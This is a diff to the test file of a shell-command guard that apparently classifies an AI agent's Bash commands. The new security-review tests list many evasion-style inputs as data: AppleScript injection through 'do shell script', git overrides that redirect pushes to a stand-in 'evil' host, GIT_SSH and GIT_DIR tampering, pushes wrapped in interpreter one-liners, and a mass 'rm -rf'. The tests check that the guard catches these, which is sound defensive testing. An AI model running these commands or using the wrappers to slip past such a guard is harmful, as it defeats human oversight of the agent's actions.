@@ -2,6 +2,7 @@ from __future__ import annotations
 
 import os
 import subprocess
+import time
 from unittest import mock
 
 from helpers import DwTestCase
@@ -144,8 +145,8 @@ class ShellFormTests(GuardClassifyBase):
             ("git commit -m \"$(cat <<'EOF'\nfix: it's done\nEOF\n)\"", None),
             ("echo \"$(bash <<'EOF'\ngit push origin main\nEOF\n)\"", "merge"),
             ("git -c alias.p=push p origin main", "control"),
-            ("printf '%s\\n' main | xargs -I{} git push origin {}", "merge"),
-            ("git push origin $BRANCH", "merge"),
+            ("printf '%s\\n' main | xargs -I{} git push origin {}", "control"),
+            ("git push origin $BRANCH", "control"),
             ("f() { git push origin main; }; f", "merge"),
             ("(cd /x && git push origin main)", "merge"),
             ("npx vercel --prod", "deploy"),
@@ -370,7 +371,7 @@ class InlineCodeAndWrapperTests(GuardClassifyBase):
             ("echo '{a,b}' \"{c,d}\" ${HOME}", None),
         ])
         # Too many expansions: the word is dynamic, like a glob.
-        self.assertEqual(self.category(self.bash("git push origin x{1..999}{a,b}")), "merge")
+        self.assertEqual(self.category(self.bash("git push origin x{1..999}{a,b}")), "control")
 
     def test_globs_in_protected_paths(self):
         claude = self.home / ".claude"
@@ -477,6 +478,153 @@ class GitRulingTests(GuardClassifyBase):
         for command, expected in rows:
             with self.subTest(command=command):
                 self.assertEqual(self.repo_cmd(repo, command), expected)
+
+
+class SecurityReviewTests(GuardClassifyBase):
+    def check_rows(self, rows, cwd="/p", project="/p"):
+        for command, expected in rows:
+            with self.subTest(command=command):
+                result = self.bash(command, cwd=cwd, project=project)
+                self.assertEqual(self.category(result), expected, result)
+
+    def test_applescript_notification_exception_is_narrow(self):
+        self.check_rows([
+            ("osascript -e 'display notification \"done\"'", None),
+            ("osascript -e 'display notification \"a\\\" & (do shell script \\\"id\\\") & \\\"b\"'",
+             "send"),
+            ("osascript -e 'display notification \"x\" with title \"do shell script\"'", "send"),
+            ("osascript -e 'display notification \"tell me\"'", "send"),
+            ("osascript -e 'display notification \"\u00abevent\u00bb\"'", "send"),
+            ("osascript -e 'display notification \"a\"\ndisplay notification \"b\"'", "send"),
+            ("osascript -e 'display notification \"a\"; quit'", "send"),
+            ("osascript -e 'run script \"x\"'", "send"),
+        ])
+
+    def test_configured_push_refspecs_are_expanded(self):
+        repo = self.make_repo(branch="feature/a")
+        _git(repo, "branch", "main")
+        _git(repo, "branch", "feature/b")
+        run = lambda c: self.category(self.bash(c, cwd=str(repo), project=str(repo)))
+        _git(repo, "config", "remote.origin.push", "refs/heads/*:refs/heads/*")
+        self.assertEqual(run("git push"), "merge")
+        _git(repo, "config", "--replace-all", "remote.origin.push", "refs/heads/feature/*:refs/heads/feature/*")
+        self.assertIsNone(run("git push"))
+        _git(repo, "config", "--add", "remote.origin.push", "refs/heads/feature/b:refs/heads/main")
+        self.assertEqual(run("git push"), "merge")
+        _git(repo, "config", "--unset-all", "remote.origin.push")
+        _git(repo, "config", "remote.origin.push", "refs/heads/feature/*:refs/heads/feature/*")
+        _git(repo, "checkout", "-q", "--detach")
+        self.assertEqual(run("git push"), "merge")
+        _git(repo, "config", "--replace-all", "remote.origin.push", "a*b*:c*")
+        _git(repo, "checkout", "-q", "feature/a")
+        self.assertEqual(run("git push"), "merge")
+
+    def test_git_config_overrides_and_environment(self):
+        self.check_rows([
+            ("git -c remote.origin.url=git@evil:x push origin feature/x", "control"),
+            ("git -c remote.origin.pushurl=x push origin feature/x", "control"),
+            ("git -c push.default=matching push", "control"),
+            ("git -c url.git@evil:.insteadOf=https://h/ fetch", "control"),
+            ("git -c branch.feature.merge=refs/heads/main push", "control"),
+            ("git -c include.path=/tmp/x status", "control"),
+            ("git -c includeIf.gitdir:/p/.path=/tmp/x status", "control"),
+            ("GIT_CONFIG_GLOBAL=/tmp/g git push origin feature/x", "control"),
+            ("GIT_CONFIG_SYSTEM=/tmp/g git status", "control"),
+            ("GIT_CONFIG=/tmp/g git status", "control"),
+            ("GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_VALUE_0=push git x", "control"),
+            ("GIT_DIR=/other/.git git push origin feature/x", "control"),
+            ("GIT_WORK_TREE=/other git status", "control"),
+            ("GIT_SSH=/tmp/s git fetch", "control"),
+            ("env GIT_DIR=/x git log", "control"),
+            ("export GIT_SSH_COMMAND='ssh -i k' && git push origin feature/x", "control"),
+            ("git -c user.email=a@b commit -m x", None),
+            ("git -c core.autocrlf=false status", None),
+            ("GIT_PAGER=cat git log", None),
+        ])
+
+    def test_wrapper_option_clusters(self):
+        self.check_rows([
+            ("script -qc 'git push origin main' /dev/null", "merge"),
+            ("script -c'git push origin main' /dev/null", "merge"),
+            ("script --command='git push origin main' /dev/null", "merge"),
+            ("script --command 'git push origin main' /dev/null", "merge"),
+            ("flock -nc 'git push origin main' /tmp/l", "merge"),
+            ("flock --command='git push origin main' /tmp/l", "merge"),
+            ("flock -n /tmp/l git push origin main", "merge"),
+            ("script -qc 'npm test' /dev/null", None),
+            ("flock -n /tmp/l npm test", None),
+            ("script -Z weird git push origin main", "control"),
+            ("flock --frobnicate /tmp/l npm test", "control"),
+            ("timeout --frobnicate 5 npm test", "control"),
+            ("nice -n 5 npm test", None),
+            ("nice -5 npm test", None),
+            ("env -i PATH=/bin npm test", None),
+            ("sudo -u root npm test", None),
+            ("xargs -0 -n 1 echo", None),
+        ])
+
+    def test_interpreter_option_clusters(self):
+        self.check_rows([
+            ("perl -ne 'system(\"git push origin main\")' f", "merge"),
+            ("perl -pe 'system(\"git push origin main\")' f", "merge"),
+            ("perl -e'system(\"git push origin main\")'", "merge"),
+            ("ruby -we 'system(\"docker push a/b:1\")'", "deploy"),
+            ("python3 -Bc \"import os; os.system('git push origin main')\"", "merge"),
+            ("python3 -c\"import os; os.system('git push origin main')\"", "merge"),
+            ("node --eval=\"require('child_process').execSync('kubectl apply -f x')\"", "deploy"),
+            ("node --print=\"require('child_process').execSync('kubectl apply -f x')\"", "deploy"),
+            ("perl -pie 's/a/b/' f", "control"),
+            ("python3 -Zc 'print(1)'", "control"),
+            ("perl -ne 'print' f", None),
+            ("perl -pi -e 's/a/b/' f", None),
+            ("perl -Mstrict -e 'print 1'", None),
+            ("python3 -Bc 'print(1)'", None),
+            ("python3 -u script.py", None),
+            ("ruby -rjson -e 'p 1'", None),
+            ("python3 -c \"$CODE\"", "control"),
+            ("node -e \"$(cat x.js)\"", "control"),
+        ])
+
+    def test_resource_caps(self):
+        start = time.time()
+        result = self.bash("git push origin x{1..100000000}")
+        self.assertLess(time.time() - start, 1.0)
+        self.assertIsNotNone(result)
+        start = time.time()
+        self.assertIsNotNone(self.bash("rm -rf /Users/me/{1..100000000}"))
+        self.assertLess(time.time() - start, 1.0)
+        big = self.home / "big"
+        big.mkdir()
+        for i in range(6000):
+            (big / ("f%d" % i)).touch()
+        start = time.time()
+        result = self.guard.classify("Bash", {"command": "cat big/*/settings.json"}, str(self.home),
+                                     "/p", self.rules)
+        self.assertLess(time.time() - start, 3.0)
+        self.assertEqual(self.category(result), "control")
+
+    def test_sensitive_program_set(self):
+        names = self.guard.sensitive_programs(self.rules)
+        for name in ("git", "gh", "kubectl", "helm", "curl", "osascript", "dw", "bash", "xargs",
+                     "script", "flock", "python3", "psql", "rm"):
+            self.assertIn(name, names)
+        self.assertNotIn("ls", names)
+
+    def test_sensitive_programs_fail_closed_on_unreadable_words(self):
+        self.check_rows([
+            ("git $(echo push) origin main", "control"),
+            ("git push origin \"$B\"", "control"),
+            ("git push \"$REMOTE\" feature/x", "control"),
+            ("kubectl $VERB -f x", "control"),
+            ("helm \"$(echo upgrade)\" a ./c", "control"),
+            ("gh pr $ACTION 3", "control"),
+            ("ls $(echo x)", None),
+            ("echo $HOME $USER", None),
+            ("cat \"$FILE\"", None),
+            ("git commit -m \"$MSG\"", None),
+            ("git log $(git merge-base HEAD main)..HEAD", None),
+            ("npm test -- $ARGS", None),
+        ])
 
 
 class GuardEntryPresentTests(DwTestCase):
